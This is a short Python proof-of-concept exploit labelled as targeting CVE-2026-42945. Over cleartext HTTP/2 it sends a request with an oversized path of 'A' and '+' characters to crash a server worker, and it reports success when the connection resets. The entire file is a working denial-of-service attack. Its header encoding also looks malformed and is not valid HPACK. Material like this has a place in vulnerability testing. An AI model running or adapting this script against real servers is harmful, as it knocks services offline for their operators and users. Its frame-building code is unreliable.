#!/usr/bin/env python3
import argparse
import socket
import sys
import time


H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def create_h2_frame(stream_id, flags, frame_type, payload):
    length = len(payload)
    frame = bytearray(9)
    frame[0] = (length >> 16) & 0xff
    frame[1] = (length >> 8) & 0xff
    frame[2] = length & 0xff
    frame[3] = frame_type
    frame[4] = flags
    frame[5] = (stream_id >> 24) & 0xff
    frame[6] = (stream_id >> 16) & 0xff
    frame[7] = (stream_id >> 8) & 0xff
    frame[8] = stream_id & 0xff
    return bytes(frame) + payload


def build_headers_frame(stream_id, headers, end_stream=False):
    payload = b''
    for name, value in headers:
        name_bytes = name.encode()
        value_bytes = value.encode()
        payload += bytes([len(name_bytes)]) + name_bytes + value_bytes

    flags = 0x04
    if end_stream:
        flags |= 0x01
    return create_h2_frame(stream_id, flags, 0x01, payload)


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-42945 over HTTP/2")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=19321)
    parser.add_argument("--insecure", action="store_true",
                        help="Use h2c (HTTP/2 cleartext)")
    args = parser.parse_args()

    payload = "A" * 349 + "+" * 969
    uri = f"/api/{payload}"

    s = socket.create_connection((args.host, args.port), timeout=10)

    if args.insecure:
        s.sendall(H2_PREFACE)
        settings_frame = create_h2_frame(0, 0x00, 0x04, b'')
        s.sendall(settings_frame)
        time.sleep(0.1)

        headers = [
            (':method', 'GET'),
            (':path', uri),
            (':scheme', 'http'),
            (':authority', f'localhost:{args.port}'),
        ]
        headers_frame = build_headers_frame(1, headers, end_stream=True)
        s.sendall(headers_frame)
    else:
        print("TLS not implemented. Use --insecure for h2c.")
        s.close()
        return 1

    time.sleep(1)
    crashed = False
    try:
        data = s.recv(4096)
        print(f"Response: {data[:200]}")
    except (ConnectionResetError, BrokenPipeError, OSError):
        crashed = True
        print("[+] Worker crashed via HTTP/2")

    s.close()
    return 0 if crashed else 1


if __name__ == "__main__":
    sys.exit(main())
